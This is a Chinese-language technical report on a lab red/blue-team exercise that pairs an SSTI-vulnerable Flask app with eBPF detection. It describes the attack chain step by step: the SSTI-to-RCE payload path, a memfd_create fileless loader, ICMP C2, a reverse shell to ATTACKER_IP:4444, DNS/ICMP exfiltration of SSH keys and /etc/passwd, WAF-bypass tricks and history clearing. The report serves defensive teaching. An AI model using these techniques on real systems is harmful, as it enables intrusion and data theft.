# 企業級紅藍對抗技術分析報告

## 1. 摘要

本專案實作一套完整的 Cyberattack Kill Chain 攻防演練，涵蓋紅藍雙方多項工具與技術，並以 7 回合迭代式對抗展示攻擊與防禦的動態升級過程。專案架構分為三大模組：

| 模組 | 元件 | 角色 |
|------|------|------|
| 靶機 | `target_app.py` | 帶有 SSTI 漏洞的 Flask Web 服務 (Port 9999) |
| 靶機 | `honeypot.py` | 假 SSH 蜜罐 (Port 2222)，偵察陷阱 |
| 紅軍 | `red_attacker.py` | SSTI → memfd_create 無檔案執行 + AES-256-CTR ICMP C2 |
| 紅軍 | `red_reverse_shell.py` | TCP 反向 Shell，繞過 eBPF v1 |
| 紅軍 | `exploit.py` | 舊版 WAF bypass 攻擊（備用方案） |
| 紅軍 | `exfil_agent.py` + `exfil_listener.py` | DNS/ICMP 隱蔽通道資料外洩 |
| 紅軍 | `recon.sh`, `ip_switch.sh`, `deploy_agent.sh`, `post_exploit.sh` | 偵察、IP 切換、部署、後滲透腳本 |
| 藍軍 | `blue_ebpf_mdr.py` (v1) | eBPF 偵測：3 hook (memfd_create, execve, socket) |
| 藍軍 | `blue_ebpf_mdr_v2.py` (v2) | eBPF 偵測：6 hook (新增 connect, dup2, dup3) |
| 藍軍 | `blue_mdr_network.py` | 網路 MDR：trap.log 監控 + iptables 自動封鎖 |
| 藍軍 | `soc_dashboard.py` | 即時 SOC 網頁儀表板 (Port 8080) |

本報告聚焦於每個攻擊/防禦動作的**底層原理 (underlying principles)**、**目的 (purpose)** 與**對目標系統的影響 (impact)**，並詳細說明從單一防禦到多層縱深防禦的演進過程。

---

## 2. 環境架構

```
┌──────────────────────────┐              ┌──────────────────────────────┐
│  Attacker (WSL2 筆電)     │              │  Target Machine (Lab 機器)    │
│                          │              │                              │
│  red_attacker.py         │    ICMP      │  target_app.py  (Flask :9999)│
│  (SSTI + memfd + C2)     │◄════════════►│  honeypot.py    (SSH  :2222) │
│                          │              │                              │
│  red_reverse_shell.py    │    TCP       │  blue_ebpf_mdr.py    (v1)   │
│  (TCP Reverse Shell)     │◄────────────►│  blue_ebpf_mdr_v2.py (v2)   │
│                          │              │  blue_mdr_network.py         │
│  exfil_listener.py       │   DNS/ICMP   │  soc_dashboard.py   (:8080) │
│  (資料外洩接收器)          │◄────────────│                              │
│                          │              │                              │
│  recon.sh, ip_switch.sh  │              │                              │
│  exploit.py, deploy_agent│              │                              │
└──────────────────────────┘              └──────────────────────────────┘
```

- **攻擊機**: WSL2 Linux (Ubuntu 22.04)，紅隊工具不需要 eBPF 支援
- **靶機/防禦機**: Lab 機器 (Ubuntu 24.04 原生)，運行靶機服務 + 全部藍隊防禦
- **通訊協議**: ICMP Echo Request（主要 C2）、TCP（反向 Shell）、DNS/ICMP（資料外洩）

### 2.1 雙層防禦架構

```
┌─────────────────────────────────────────────────────┐
│  第一層 — 網路層（網路欺敵）                          │
│  honeypot.py（Port 2222）→ trap.log →               │
│  blue_mdr_network.py → iptables DROP                │
│  偵測：偵察行為，封鎖已知惡意 IP                       │
├─────────────────────────────────────────────────────┤
│  第二層 — 核心層（eBPF 行為偵測）                     │
│  v1: memfd_create + execve + 原始 ICMP socket        │
│  v2: + connect（可疑埠）+ dup2/dup3（Shell 偵測）     │
│  偵測：惡意行為，不論來源 IP                           │
├─────────────────────────────────────────────────────┤
│  可視化 — SOC 儀表板（Port 8080）                    │
│  即時網頁 UI 聚合所有防禦事件                         │
└─────────────────────────────────────────────────────┘
```

| 層級 | 機制 | 防護範圍 | 限制 |
|------|------|----------|------|
| 網路層 | 蜜罐 + iptables 自動封鎖 | 封鎖已知惡意 IP | 攻擊者可更換 IP 繞過 |
| 核心層 | eBPF 系統呼叫 hook + bpf_send_signal | 封鎖惡意行為，不論來源 IP | 需要知道要監控哪些系統呼叫 |

---

## 3. Kill Chain 各階段分析

### Phase 1: 偵察 (Reconnaissance)

**工具**: `recon.sh` (nmap 自動化偵察)

**動作**: 掃描目標機器的開放端口與服務版本。

```bash
bash red_team/recon.sh <TARGET_IP>
# 或手動執行
nmap -p 2000-10000 -sV <TARGET_IP>
```

**原理**: Web 應用偵察的核心是理解應用的**輸入面 (attack surface)**。nmap 的服務版本偵測 (`-sV`) 會嘗試與每個開放端口建立連線並分析回應 banner，識別服務類型。

**關鍵發現**:
- Port 2222: SSH banner (OpenSSH 8.9p1) — 實際上是蜜罐陷阱
- Port 9999: Diagnostic API — 真正的攻擊目標 (Flask SSTI 漏洞)

**影響**: 確認攻擊向量，但若貿然連接 Port 2222，會觸發蜜罐 → 網路 MDR → IP 封鎖。

#### 1.1 蜜罐陷阱與 IP 封鎖

**元件**: `honeypot.py` + `blue_mdr_network.py`

蜜罐在 Port 2222 上模擬 OpenSSH 伺服器，發送符合 RFC 4253 的 SSH 版本 banner：

```
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n
```

此 banner 足以欺騙 nmap 的服務偵測 (`-sV`)。任何連線都記錄至 `trap.log`（時間戳、來源 IP、Port、客戶端資料）。網路 MDR 輪詢 `trap.log`，偵測到新 IP 後立即執行：

```bash
iptables -I INPUT 1 -s <attacker_ip> -j DROP
```

規則插入在 INPUT 鏈的位置 1（最高優先級），確保優先於任何現有 ACCEPT 規則，**阻止攻擊者存取機器上的所有服務**。

**零誤報偵測**: 蜜罐不提供任何合法服務，因此任何連接都是未經授權的。

#### 1.2 IP 切換繞過 (ip_switch.sh)

**原理**: 基於 IP 的封鎖可透過 IP alias 繞過。紅隊使用 `ip_switch.sh` 在 WSL2 網路介面上掛載第二個 IP：

| IP | 用途 | 結果 |
|----|------|------|
| 主 IP | 觸發蜜罐 Port 2222 | 被 MDR 封鎖 |
| 備用 IP (alias) | 攻擊 Port 9999 | 未被封鎖 |

**影響**: 展示網路層防禦的固有限制——攻擊者只需更換來源 IP 即可繞過。此限制促使核心層（eBPF）行為偵測的需求。

---

### Phase 2: 武器化 (Weaponization)

**工具**: `red_attacker.py`

**動作**: 構建 SSTI Payload + memfd_create 無檔案載入器 + AES-256-CTR 加密 ICMP C2 Agent。

#### 2.1 SSTI (Server-Side Template Injection) 原理

Flask 使用 Jinja2 作為模板引擎。Jinja2 在 `{{ }}` 分隔符內執行 Python 表達式。

**漏洞成因 — 兩步合成錯誤** (CWE-1336):

```python
# Step 1: Python f-string 將使用者輸入嵌入模板原始碼
template = f"<pre>Query: {user_input}</pre>"
# 若 user_input = "{{ 7*7 }}"，結果字串為 "<pre>Query: {{ 7*7 }}</pre>"

# Step 2: Jinja2 將 {{ 7*7 }} 作為表達式求值 → 49
render_template_string(template)
```

**安全版本**應使用資料綁定，而非原始碼拼接:
```python
render_template_string("Query: {{ q }}", q=user_input)
# Jinja2 將 q 視為「資料」，永遠不會執行
```

**SSTI → RCE 升級路徑**:

Jinja2 表達式可以遍歷 Python 的物件模型:

```
config                           → Flask 設定物件
  .__class__                     → <class 'flask.config.Config'>
  .__init__                      → Config 的建構函式
  .__globals__                   → flask/config.py 的模組級全域變數
  ['os']                         → os 模組 (flask.config 有 import os)
  .popen('cmd')                  → 子程序執行 → RCE
```

**為什麼這條路徑可行**:
1. Python 的**自省機制 (introspection)** 允許任何物件回溯到其類別、再到任何方法所在模組的全域命名空間
2. Flask 的 `config.py` 模組在頂層 `import os`，所以 `os` 存在於 `Config.__init__.__globals__` 中
3. Jinja2 的沙箱預設只限制以底線 `_` 開頭的屬性名稱，但 `config.__class__` 的路徑中，除了 `__class__` 本身外，中間的屬性名不以底線開頭

**影響**: 完整的遠端代碼執行 (RCE)，權限等同 Flask 程序。

#### 2.2 memfd_create 無檔案執行原理

**問題**: 傳統惡意程式寫入磁碟 (`/tmp/backdoor`)，會留下檔案痕跡、觸發 inotify/fanotify 監控、被 AV/EDR 掃描。

**解決方案**: Linux `memfd_create(2)` 系統呼叫 (syscall 319, x86_64, Linux >= 3.17)。

**核心機制**:

```
memfd_create(name, flags) → fd
```

1. 在 kernel 的 **tmpfs 層**建立一個**匿名檔案 (anonymous file)**
2. 返回一個檔案描述符 (fd)，行為與普通檔案完全相同
3. **不連結到任何目錄 entry** — 在任何檔案系統上都看不到這個檔案
4. 內容存在**頁面快取 (page cache)** 中，即 RAM，不會寫入區塊裝置
5. 透過 `/proc/<pid>/fd/<N>` 可以存取這個 fd，允許 `execve()` 執行

**攻擊鏈**:

```
fd = syscall(319, "", 0)          # 在 RAM 中建立匿名 fd
os.write(fd, agent_code)           # 將 C2 agent 寫入 fd (仍在 RAM)
os.fork()                          # 分叉：父程序返回讓 Flask 回應
  ├── parent: exits                # popen() 完成，HTTP 回應正常
  └── child: execve(python3,       # 從 memfd 執行 agent
        /proc/<pid>/fd/<N>)        # kernel 解析路徑 → 讀取 memfd → 執行
```

**為什麼 `/proc/<pid>/fd/N` 能用於 execve**:
- `procfs` 是虛擬檔案系統，每個 fd entry 是指向 kernel `struct file` 的符號連結
- `execve()` 解析符號連結，到達匿名 inode，讀取 memfd 內容載入
- `fork()` 複製 fd 表，子程序的 fd 副本獨立有效，即使父程序退出

**為什麼需要 fork()**:
- SSTI 的 `popen()` 子程序必須迅速退出，Flask 才能回傳 HTTP 回應
- `fork()` 後父程序立即退出，子程序成為孤兒程序，被重新掛載到 PID 1
- 子程序的 memfd fd 仍然有效（fork 複製了 fd 表）

**影響**: 磁碟上零檔案痕跡。規避所有基於檔案的 AV/EDR 偵測。

#### 2.3 雙層 Base64 編碼

payload 使用雙層 base64 編碼來避免**所有**跳脫字元問題:

```
[Agent Python 程式碼]
    → base64 編碼 → agent_b64
        → 嵌入 Loader Python 腳本
            → base64 編碼 → loader_b64
                → 嵌入 SSTI 字串: echo loader_b64 | base64 -d | python3
                    → URL 編碼 → curl -d "query=..."
```

**為什麼雙層而非單層**: SSTI 字串內部使用單引號包覆 shell 命令，如果 loader 腳本含有引號，會破壞 SSTI 語法。Base64 只含 `A-Za-z0-9+/=`，在 shell 和 Jinja2 中都是安全字元。

#### 2.4 AES-256-CTR 加密原理

**為什麼從 XOR 升級到 AES-256-CTR**:

本專案的 C2 加密從早期的 XOR 串流密碼升級為 AES-256-CTR（計數器模式），以達到業界標準的加密強度。

| 特性 | XOR（原始版本） | AES-256-CTR（目前版本） |
|------|----------------|----------------------|
| 演算法 | XOR 串流密碼 | AES-256 計數器模式 (NIST SP 800-38A) |
| 金鑰推導 | 固定 16 位元組明文金鑰 | SHA-256(shared_secret) → 32 位元組 |
| IV/Nonce | 無 | 每個封包隨機 16 位元組 IV (os.urandom(16)) |
| 已知明文抵抗性 | 可輕易破解（已知任一明文位元組即可還原對應 key） | 計算上不可行 |
| 頻率分析抵抗性 | 脆弱（無 IV → 相同明文 = 相同密文） | 安全（隨機 IV → 相同明文 ≠ 相同密文） |
| 實作方式 | 純 Python | ctypes + OpenSSL libcrypto |
| 依賴 | 無 | 系統 libcrypto（Linux 預裝，無需 pip 安裝） |

**AES-256-CTR 運作原理**:

CTR 模式作為串流密碼運作：透過 AES-256 加密連續的計數器值來產生偽隨機金鑰流，然後將金鑰流與明文進行 XOR 運算：

```
金鑰流 = AES-256-Encrypt(key, IV || counter_0) ||
         AES-256-Encrypt(key, IV || counter_1) || ...
密文 = 明文 ⊕ 金鑰流
```

- **語義安全性**: 每個封包使用隨機 IV，相同明文產生不同密文，防止模式分析
- **無需填充**: CTR 模式產生與明文等長的密文，適合有大小限制的 ICMP 協定
- **零 pip 依賴**: 透過 Python ctypes 直接呼叫系統 OpenSSL libcrypto

**金鑰推導**: `AES_KEY = SHA-256(SHARED_SECRET)` → 32 bytes
**每封包**: `IV = os.urandom(16)`，前置於密文

**此升級展示兩個重要觀點**:
1. 真實世界的惡意程式越來越多地使用強加密
2. **行為偵測（eBPF）無論加密強度如何都依然有效**，因為它偵測的是惡意的系統呼叫模式，而非 payload 內容

---

### Phase 3: 投遞 (Delivery)

**動作**: 透過 HTTP POST 將 SSTI payload 送至 `/diag` 端點。

```bash
curl -s -X POST http://TARGET:9999/diag -d "query=SSTI_PAYLOAD"
```

**原理**: HTTP POST body 中的 `query=` 參數經 URL 解碼後成為 Jinja2 模板原始碼的一部分。Flask 的 `request.form.get('query')` 自動 URL 解碼，還原出完整的 `{{ }}` 表達式。

**影響**: 在靶機上觸發 SSTI → RCE → memfd_create → fork+execve → 記憶體駐留 agent。

---

### Phase 4: 利用與安裝 (Exploitation & Installation)

**動作**: 建立 AES-256-CTR 加密的 ICMP 隱蔽 C2 通道。

#### 4.1 ICMP 隱蔽通道原理

ICMP (Internet Control Message Protocol, RFC 792) 是第 3 層協議，用於網路診斷。

**為什麼 ICMP 適合做隱蔽通道**:
1. 防火牆通常**預設允許 ICMP**（阻擋會破壞 ping/traceroute）
2. ICMP Echo Request/Reply 的**資料欄位長度任意** — 協議不限制 payload 內容
3. 多數 IDS/IPS 檢查 TCP/UDP 連接埠與封包內容，但將 ICMP payload 視為不透明的診斷資料
4. ICMP **沒有連接埠號** → 無連線狀態 → 更難追蹤

**Linux Raw Socket 行為**:
```python
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)  # 需要 root 或 CAP_NET_RAW
```
- kernel 將每個進入的 ICMP 封包的**副本**送至 raw socket
- kernel **同時**自動回覆 echo request（發送 echo reply）
- 我們透過 ICMP ID 欄位 (0x1337) 和 type (8 = echo request) 過濾 C2 流量

**我們的協議設計**:

```
┌─────────────────────────────────────────────────────┐
│ IP Header (20B) │ ICMP Header (8B) │ Payload        │
│                 │ type=8 code=0    │ ┌─────────────┐│
│                 │ checksum         │ │ MAGIC  (1B) ││
│                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
│                 │ SEQ              │ │ AES-256-CTR ││
│                 │                  │ │ encrypted   ││
│                 │                  │ │ data        ││
│                 │                  │ └─────────────┘│
└─────────────────────────────────────────────────────┘

MSG_TYPE:
  0x01 = Heartbeat (Agent → C2)
  0x02 = Command   (C2 → Agent)
  0x03 = Result    (Agent → C2, chunked)
```

**加密封包格式**: 每個封包的 payload 結構為 `MAGIC + MSG_TYPE + IV(16B) + AES-CTR-ciphertext`。接收方讀取 IV 後使用共享金鑰解密。

#### 4.2 ICMP Checksum (RFC 1071)

```
1. 將封包視為 16-bit big-endian 整數序列
2. 對所有整數做 ones' complement 加法 (進位回捲)
3. 取最終和的 ones' complement (bitwise NOT)
```

接收端對整個封包（含 checksum 欄位）執行相同計算，若結果為 `0xFFFF`，封包有效。

---

### Phase 5: C2 命令與控制 (Command & Control)

**動作**: Agent 定期發送 heartbeat，接收並執行 C2 命令。

**Agent 執行迴圈**:
1. 初始 heartbeat: 傳送 hostname、UID、kernel 版本
2. 每 30 秒重複 heartbeat
3. 接收 MSG_COMMAND → `subprocess.run(cmd, shell=True)` 執行
4. 將輸出分割為 480 byte 的 chunk → 逐一以 AES-256-CTR 加密傳回
5. 收到 `__exit__` → 關閉 socket 並終止

**Timing Jitter（時序抖動）**:
```python
time.sleep(random.uniform(1.0, 2.5))  # 主迴圈每輪隨機等待 1~2.5 秒
time.sleep(0.05)                       # chunk 之間 50ms 延遲
```
這種隨機延遲使流量模式分析（例如週期性 beacon 偵測）更加困難。

**影響**: 攻擊者獲得完整的遠端 shell 存取，通訊以 AES-256-CTR 加密隱藏在 ICMP 流量中。

---

### Phase 5b: TCP 反向 Shell — 繞過 eBPF v1 (Evasion)

**工具**: `red_reverse_shell.py`

**背景**: 藍軍已部署 eBPF v1 (`blue_ebpf_mdr.py --kill`)，成功攔截了 memfd_create 攻擊。紅隊需要適應。

**繞過原理**: eBPF v1 的三個 hook 以及紅隊對策:

| eBPF v1 Hook | 反向 Shell 是否觸發 | 為什麼 |
|--------------|-------------------|--------|
| `memfd_create` | 不觸發 | 不使用 memfd，直接 fork |
| `execve /proc/fd` | 不觸發 | 不從 /proc/fd 執行，直接 `pty.spawn("/bin/bash")` |
| `socket(SOCK_RAW)` | 不觸發 | 使用 SOCK_STREAM (標準 TCP)，不是 SOCK_RAW |

**攻擊鏈**:

```
SSTI → os.popen → base64 -d → python3 → fork()
  └→ child: socket(AF_INET, SOCK_STREAM, 0)
       → connect(ATTACKER_IP:4444)  # 普通 TCP 外連
       → dup2(sock, 0)              # stdin 重導向至 socket
       → dup2(sock, 1)              # stdout 重導向至 socket
       → dup2(sock, 2)              # stderr 重導向至 socket
       → pty.spawn("/bin/bash")     # 互動式 shell
```

**關鍵差異**:
- 不需要 sudo（TCP socket 不需 root 權限，與 ICMP raw socket 不同）
- 不需要 memfd_create（沒有無檔案載入步驟）
- 使用完全合法的系統呼叫，eBPF v1 完全無法偵測

**影響**: 即使藍軍啟動了 eBPF v1 防禦，紅隊仍可獲得完整的互動式 shell。

---

### Phase 5c: 資料外洩 (Exfiltration)

**工具**: `exfil_agent.py`（靶機端）+ `exfil_listener.py`（攻擊機端）+ `deploy_agent.sh`（部署腳本）

**動作**: 在已滲透的靶機上蒐集敏感資料，透過隱蔽通道外傳至攻擊機。

#### 外洩目標

Agent 自動蒐集以下敏感資料:
- `/etc/passwd` — 使用者帳號列表
- SSH 金鑰 — 用於橫向移動
- Bash 歷史記錄 — 可能含有密碼或敏感指令
- 應用程式原始碼 — 業務邏輯與密鑰

#### 雙通道傳輸

Agent 具備自動偵測功能，優先使用 DNS 通道，DNS 不可用時自動切換至 ICMP:

**DNS 通道**:
- 資料經 Base32 編碼後嵌入為 DNS 查詢中受控域名的子域名標籤
- 格式: `<encoded_data>.x.exfil.local`
- 攻擊者端的假 DNS 伺服器 (`exfil_listener.py`) 重組這些片段

**ICMP 通道**:
- 資料經十六進位編碼後嵌入 ICMP echo request 的填充模式中
- 透過 `ping -p` 選項傳送

**共同特性**:
- 帶序號的分塊傳輸
- 完整性驗證的校驗碼
- 隨機化的封包間延遲（DNS: 0.1-0.5s, ICMP: 0.2-0.8s）以規避模式偵測
- Agent 傳輸完成後自動刪除

---

### Phase 6: 後滲透與清除 (Post-Exploitation & Cleanup)

**工具**: `post_exploit.sh`

在 C2 shell 或反向 shell 中執行情報蒐集:

```
whoami && id        → 確認執行身份與群組
uname -a            → 作業系統與 kernel 版本
cat /etc/passwd     → 使用者列表
ls -la /home/       → 家目錄偵察
env                 → 環境變數（可能含密鑰）
```

清除痕跡:
```bash
history -c          → 清除命令歷史
```

---

### 備用攻擊: WAF Bypass (exploit.py)

**工具**: `exploit.py` — 舊版 WAF bypass 攻擊

**原理**: 若目標部署了基本的 Web 應用防火牆（WAF）黑名單過濾空格、`bash`、`nc`、`sh`、`/dev/tcp` 等關鍵字，可透過以下方式繞過:
- `${IFS}` 取代空格（IFS = Internal Field Separator，Bash 預設值包含空格）
- Base64 編碼繞過關鍵字偵測
- 反斜線混淆

此工具作為備用方案，在主攻擊路徑（`red_attacker.py`）不可用時使用。

---

## 4. 藍軍防禦分析

### 4.1 eBPF 架構原理

**eBPF (extended Berkeley Packet Filter)** 是 Linux kernel 的可程式化虛擬機，允許在**不修改 kernel 原始碼**的情況下，在 kernel 空間執行自訂邏輯。

**執行流程**:
```
C 原始碼 → Clang/LLVM 編譯 → eBPF 位元碼 → Kernel Verifier 驗證
  → JIT 編譯為 x86_64 原生機器碼 → 附加到 Tracepoint → 零開銷即時執行
```

**安全保證 (Verifier 強制)**:
- 無無界迴圈（必須可證明終止）
- 無越界記憶體存取
- 無任意指標解引用
- stack 大小限制 512 bytes
- → **eBPF 程式不可能使 kernel 崩潰或掛起**

### 4.2 Tracepoint vs Kprobe

| 特性 | Tracepoint | Kprobe |
|------|-----------|--------|
| 類型 | 靜態（編譯進 kernel） | 動態（runtime 注入） |
| 穩定性 | 跨版本 ABI 穩定 | 函式簽名可能變更 |
| 觸發時機 | syscall 進入/退出 | 任意 kernel 函式 |
| 適用場景 | syscall 監控 | 深層 kernel 除錯 |

我們選擇 **Tracepoint** 因為:
1. `sys_enter_*` 在 syscall **執行前**觸發 → 可搶先擊殺
2. 跨 kernel 5.x–6.x 版本穩定
3. BCC 提供簡潔的 `TRACEPOINT_PROBE()` 巨集

### 4.3 `bpf_send_signal(SIGKILL)` 機制

Linux 5.3+ 提供的 BPF helper，從 kernel 空間直接發送信號。

**為什麼比 userspace kill() 更有效**:

```
eBPF 路徑 (bpf_send_signal):
  syscall 進入 → tracepoint 觸發 → eBPF 執行 →
  → bpf_send_signal(9) → 程序被殺 (syscall 未完成)
  延遲: < 1 微秒

Userspace 路徑 (kill()):
  syscall 進入 → tracepoint 觸發 → eBPF 發送 perf event →
  → Python 讀取 event → Python 呼叫 os.kill() → kernel 投遞信號
  延遲: 數毫秒 (期間 malware 可能已完成操作)
```

**關鍵差異**: 使用 `bpf_send_signal`，程序在 `memfd_create` syscall **尚未執行**時就被殺掉。攻擊鏈在第一步就被打斷。

### 4.4 eBPF v1 — 三重偵測策略 (blue_ebpf_mdr.py)

| Hook | Syscall | 偵測邏輯 | 嚴重度 |
|------|---------|---------|--------|
| Hook 1 | `memfd_create(319)` | 任何呼叫 → 記錄 PID + 警報 | HIGH |
| Hook 2 | `execve` | 路徑匹配 `/proc/*/fd/*` → 無檔案執行確認 | CRITICAL |
| Hook 3 | `socket` | AF_INET + SOCK_RAW + ICMP + PID 關聯 memfd → C2 確認 | CRITICAL |

**關聯偵測 (Correlation)**:
- 單獨的 memfd_create → HIGH（可能是合法用途如 Chrome IPC）
- 單獨的 raw ICMP socket → ALERT（可能是 ping）
- memfd_create **+** raw ICMP socket → **CRITICAL + CORRELATED**（無檔案 C2 確認）

**冷啟動偵測**: `/proc/*/exe` 掃描器在啟動時檢查已運行的 memfd 程序，確保在 eBPF 載入前已植入的惡意程式也能被偵測。

**v1 的限制**: 僅偵測使用 memfd_create + ICMP raw socket 的攻擊。標準的 TCP 反向 Shell（fork → connect → dup2 → pty.spawn）完全繞過所有三個 hook。

### 4.5 eBPF v2 — 六重偵測策略 (blue_ebpf_mdr_v2.py)

保留 v1 全部 3 個 hook，並新增 3 個 hook 偵測反向 Shell:

| Hook | Syscall | 偵測邏輯 | 嚴重度 |
|------|---------|---------|--------|
| Hook 1-3 | (同 v1) | (同 v1) | HIGH/CRITICAL |
| Hook 4 | `sys_enter_connect` | 檢查目的埠是否在可疑埠清單中（預設: 4444, 4445, 5555, 1234, 1337） | HIGH |
| Hook 5 | `sys_enter_dup2` | 追蹤每個 PID 的位元遮罩；當 fd 0, 1, 2 全部被重導向 → 確認反向 Shell | CRITICAL |
| Hook 6 | `sys_enter_dup3` | 同 Hook 5，覆蓋 Python `os.dup2(fd, fd2, inheritable=False)` 的程式碼路徑 | CRITICAL |

**雙重策略偵測反向 Shell**:

**策略 1 — 可疑埠偵測 (Hook 4)**:
- 監控 `connect()` 呼叫，若目的埠匹配已知 C2/Shell 埠（4444 等），立即警報並可選擇擊殺
- 在連線建立時即時偵測

**策略 2 — 行為模式偵測 (Hook 5+6)**:
- 追蹤每個 PID 的 `dup2()`/`dup3()` 呼叫
- 使用位元遮罩記錄: `dup2(fd, 0)` → bit 0, `dup2(fd, 1)` → bit 1, `dup2(fd, 2)` → bit 2
- 當同一程序的三個標準檔案描述符（stdin=0, stdout=1, stderr=2）**全部**被重導向，即觸發 CRITICAL 警報
- **不依賴埠號**: 即使反向 Shell 使用 80/443 等常見埠，仍可透過行為偵測

**為什麼需要同時 hook dup2 和 dup3**: Python 的 `os.dup2(fd, fd2, inheritable=False)` 在底層呼叫的是 `dup3()` 而非 `dup2()`，因此兩者都需要監控才能完整覆蓋。

### 4.6 網路 MDR (blue_mdr_network.py)

| 功能 | 說明 |
|------|------|
| 觸發來源 | `trap.log`（蜜罐日誌） |
| 封鎖方式 | `iptables -I INPUT 1 -s <IP> -j DROP` |
| 監控方式 | 輪詢 `trap.log` 新增 IP |
| 規則位置 | INPUT 鏈位置 1（最高優先級） |
| 清理功能 | `--cleanup` 退出時移除所有規則 |
| SOC 整合 | `--soc-log` 寫入 `soc_events.jsonl` |

**與 eBPF 的互補關係**:
- 網路 MDR 封鎖**已知惡意 IP**（基於偵察行為）
- eBPF 封鎖**惡意行為**（基於系統呼叫模式，不論 IP）
- 兩者組合: 已知的壞人 + 壞的行為 = 多層覆蓋

### 4.7 SOC 儀表板 (soc_dashboard.py)

基於 Flask 的即時安全營運中心網頁應用 (Port 8080)，聚合所有防禦元件的事件。

**功能特性**:
- **伺服器推送事件 (SSE)**: 即時串流至瀏覽器，無需輪詢
- **多來源攝取**: 讀取 `trap.log`（蜜罐事件）和 `soc_events.jsonl`（eBPF 警報、iptables 封鎖）
- **HTTP POST API** (`/api/event`): 供程式化提交事件
- **統計卡片**: 事件總數、封鎖 IP 數、程序終止數、嚴重警報數
- **色彩標記嚴重度**: CRITICAL（紅）、HIGH（黃）、MEDIUM（藍）、INFO（灰）
- **暗色主題 SOC 控制台 UI**: 自動捲動事件時間軸

**資料流**:
```
honeypot.py → trap.log ──────────────────────┐
blue_ebpf_mdr*.py → soc_events.jsonl ────────┤
blue_mdr_network.py → soc_events.jsonl ──────┤
                                              ▼
                                    soc_dashboard.py → 瀏覽器 (SSE)
```

**意義**: SOC 儀表板提供跨所有防禦元件的**統一態勢感知**，使藍隊能理解完整的攻擊圖像，而非對孤立的警報做出反應。

### 4.8 eBPF 資料結構

**BPF_PERF_OUTPUT (Perf Ring Buffer)**:
- kernel 與 userspace 之間的**無鎖環形緩衝區**
- kernel 寫入事件，Python 讀取事件
- 透過 mmap 共享記憶體，零拷貝

**BPF_HASH (Hash Map)**:
- kernel 與 userspace 共享的雜湊表
- `memfd_pids`: 追蹤呼叫過 memfd_create 的 PID（用於關聯偵測）
- `dup_mask`: 追蹤每個 PID 的 fd 重導向位元遮罩（v2 新增，用於反向 Shell 偵測）
- `whitelist`: userspace 寫入白名單 PID，kernel 讀取

---

## 5. 7 回合迭代式對抗演練

本專案的核心特色是將展示設計為 7 回合對抗，說明網路安全是一個持續的迭代過程：

| 回合 | 角色 | 行動 | 使用工具 | 結果 |
|------|------|------|---------|------|
| 1 | 紅隊 | 偵察（nmap 掃描） | `recon.sh` | 發現 Port 2222 (SSH) 和 Port 9999 (API) |
| 1b | 紅→藍 | 觸碰蜜罐 (Port 2222) | `honeypot.py` + `blue_mdr_network.py` | 紅隊 IP 被 iptables 封鎖 |
| 1c | 紅隊 | IP 別名繞過封鎖 | `ip_switch.sh` | 重新獲得網路存取 |
| 2 | 紅隊 | SSTI + 無檔案 ICMP C2 | `red_attacker.py` + `target_app.py` | 取得完全遠端控制（AES-256-CTR 加密） |
| 3 | 藍隊 | 部署 eBPF v1 | `blue_ebpf_mdr.py --kill` | 冷啟動掃描清除現有 agent |
| 4 | 紅隊 | 再次執行 SSTI + memfd 攻擊 | `red_attacker.py` | **被 eBPF v1 攔截**，memfd_create 觸發 SIGKILL |
| 5 | 紅隊 | TCP 反向 Shell（繞過 v1） | `red_reverse_shell.py` | **繞過 eBPF v1**，取得互動式 shell |
| 6 | 藍隊 | 升級至 eBPF v2 | `blue_ebpf_mdr_v2.py --kill` | 偵測 connect() 可疑埠 + dup2 fd 劫持，**終止反向 Shell** |
| 7 | 展示 | SOC 儀表板統一檢視 | `soc_dashboard.py` | 完整攻防歷程的即時可視化 |

**每回合的核心教訓**:

1. **回合 1-1c**: 網路層防禦（蜜罐 + 防火牆）有效但可繞過
2. **回合 2**: 無檔案攻擊 + 隱蔽通道可規避傳統偵測
3. **回合 3-4**: 核心層 eBPF 偵測可攔截已知攻擊模式
4. **回合 5**: 攻擊者會適應，使用不同的系統呼叫繞過偵測
5. **回合 6**: 防禦者必須進化，擴展偵測覆蓋面
6. **回合 7**: 統一態勢感知是安全營運的核心需求

---

## 6. MITRE ATT&CK 完整映射

### 紅軍攻擊技術

| ID | 技術名稱 | 本專案實作 | 對應工具 |
|----|---------|-----------|---------|
| T1595 | Active Scanning | nmap 埠掃描與服務偵測 | `recon.sh` |
| T1190 | Exploit Public-Facing Application | SSTI 注入 Flask `/diag` | `target_app.py` |
| T1059.006 | Command & Scripting: Python | memfd_create loader + agent + 反向 Shell | `red_attacker.py`, `red_reverse_shell.py` |
| T1620 | Reflective Code Loading | memfd_create → execve from /proc/fd | `red_attacker.py` |
| T1027 | Obfuscated Files or Information | 雙層 Base64 + AES-256-CTR 加密 | `red_attacker.py` |
| T1140 | Deobfuscate/Decode | base64 -d pipeline | `red_attacker.py` |
| T1095 | Non-Application Layer Protocol | ICMP echo request C2 channel (AES-256-CTR) | `red_attacker.py` |
| T1571 | Non-Standard Port | C2 和反向 Shell 使用 port 4444 | `red_reverse_shell.py` |
| T1053.003 | Scheduled Task: Cron | crontab 持久化反向 Shell | post-exploitation |
| T1082 | System Information Discovery | whoami, uname -a, id | `post_exploit.sh` |
| T1005 | Data from Local System | 敏感資料蒐集 (/etc/passwd, SSH keys) | `exfil_agent.py` |
| T1048.003 | Exfil Over Alternative Protocol | DNS/ICMP 隱蔽通道資料外洩 | `exfil_agent.py`, `exfil_listener.py` |
| T1070.003 | Clear Command History | `history -c` 清除痕跡 | post-exploitation |
| T1070.004 | File Deletion | exfil_agent 傳輸完成後自動刪除 | `exfil_agent.py` |

### 藍軍偵測覆蓋

| ID | 偵測面 | Hook / 機制 | 版本 | 對應工具 |
|----|--------|------------|------|---------|
| T1595 | Active Scanning | 蜜罐連線偵測 | - | `honeypot.py` + `blue_mdr_network.py` |
| T1620 | Reflective Code Loading | `sys_enter_memfd_create` | v1 | `blue_ebpf_mdr.py` |
| T1059 | Command Execution from /proc/fd | `sys_enter_execve` | v1 | `blue_ebpf_mdr.py` |
| T1095 | Non-App Layer Protocol | `sys_enter_socket` (RAW ICMP) | v1 | `blue_ebpf_mdr.py` |
| T1571 | Non-Standard Port Connect | `sys_enter_connect` | v2 | `blue_ebpf_mdr_v2.py` |
